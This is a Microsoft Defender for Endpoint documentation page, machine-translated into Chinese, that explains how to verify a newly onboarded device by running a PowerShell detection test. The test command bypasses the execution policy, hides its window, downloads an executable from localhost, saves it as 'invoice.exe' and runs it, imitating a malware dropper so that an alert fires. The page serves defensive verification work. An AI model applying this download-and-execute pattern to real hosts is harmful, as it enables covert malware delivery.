---
title: 在设备上运行检测测试，以验证设备已正确载入到 Microsoft Defender for Endpoint
description: 在最近载入到 Microsoft Defender for Endpoint 服务的设备上运行检测测试脚本，以验证是否正确添加了该脚本。
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: ec9aa659decd6815b00c9d80b2281fd8386bd082
ms.sourcegitcommit: eb8c600d3298dca1940259998de61621e6505e69
ms.translationtype: MT
ms.contentlocale: zh-CN
ms.lasthandoff: 11/24/2021
ms.locfileid: "61163190"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>在新载入的 Microsoft Defender 终结点设备上运行检测测试

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**适用于：**
- Windows 11
- 支持Windows 10版本
- Windows Server 2012 R2
- Windows Server 2016
- Windows Server 版本 1803
- Windows Server 2019
- Windows Server 2022
- [Microsoft Defender for Endpoint 计划 2](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> 希望体验 Microsoft Defender for Endpoint？ [注册免费试用版](https://signup.microsoft.com/create-account/signup?products=7f379fee-c4f9-4278-b0a1-e4c8c2fcdf7e&ru=https://aka.ms/MDEp2OpenTrial?ocid=docs-wdatp-exposedapis-abovefoldlink)。

当你将设备添加到 Microsoft Defender for Endpoint 服务以用于管理时，这也称为载入设备。 载入允许设备向服务报告有关其运行状况的信号。

确保或验证是否已将设备成功添加到服务是整个部署过程中的关键步骤。 它可确保管理所有预期的设备。 

## <a name="verify-microsoft-defender-for-endpoint-onboarding-of-a-device-using-a-powershell-detection-test"></a>使用 PowerShell 检测测试验证设备的 Microsoft Defender 终结点载入

在新载入的设备上运行以下 PowerShell 脚本，验证它是否正确报告给 Defender for Endpoint 服务。

1. 创建文件夹："C：\test-MDATP-test"。
2. 在设备上打开提升的命令行提示符并运行脚本：

   1. 转到“**开始**”并键入“**cmd**”。

   1. 右键单击命令 **提示符** ，然后选择 **以管理员角色运行**。

      ![指向"开始"菜单以管理员角色运行"的窗口。](images/run-as-admin.png)

3. 在提示符下，复制并运行以下命令：

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

命令提示符窗口将自动关闭。 如果成功，检测测试将标记为已完成，在大约 10 分钟内，新警报将显示在已载入设备的门户中。

## <a name="related-topics"></a>相关主题

- [载入 Windows 设备](configure-endpoints.md)
- [载入服务器](configure-server-endpoints.md)
- [Microsoft Defender 终结点载入问题疑难解答](/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
